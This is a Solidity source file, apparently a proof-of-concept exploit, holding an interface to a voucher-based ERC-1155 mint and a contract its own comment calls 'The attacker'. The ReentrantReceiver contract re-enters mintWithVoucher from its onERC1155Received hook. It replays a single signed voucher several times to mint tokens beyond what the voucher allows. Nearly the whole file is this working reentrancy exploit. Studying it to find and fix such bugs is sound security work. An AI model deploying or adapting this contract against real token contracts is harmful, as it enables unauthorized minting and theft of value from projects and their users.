// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVoucherMint {
    struct Voucher {
        address to;
        uint256 itemId;
        uint256 amount;
        uint256 voucherId;
        uint256 deadline;
    }
    function mintWithVoucher(Voucher calldata voucher, bytes calldata signature) external;
    function balanceOf(address owner, uint256 id) external view returns (uint256);
}

/**
 * The attacker. It is an ordinary contract that implements the ERC-1155
 * receiver hook — which is REQUIRED of any contract meant to hold tokens, so
 * there is nothing suspicious about its existence. The malice is four lines.
 */
contract ReentrantReceiver {
    IVoucherMint public immutable target;

    IVoucherMint.Voucher private voucher;
    bytes private signature;
    uint256 public reentries;
    uint256 public maxReentries;

    constructor(address target_) {
        target = IVoucherMint(target_);
    }

    function attack(
        IVoucherMint.Voucher calldata voucher_,
        bytes calldata signature_,
        uint256 maxReentries_
    ) external {
        voucher = voucher_;
        signature = signature_;
        maxReentries = maxReentries_;
        reentries = 0;
        target.mintWithVoucher(voucher_, signature_);
    }

    /// Called by the token contract while its own state is half-updated.
    function onERC1155Received(address, address, uint256, uint256, bytes calldata)
        external
        returns (bytes4)
    {
        if (reentries < maxReentries) {
            reentries += 1;
            target.mintWithVoucher(voucher, signature);
        }
        return this.onERC1155Received.selector;
    }
}
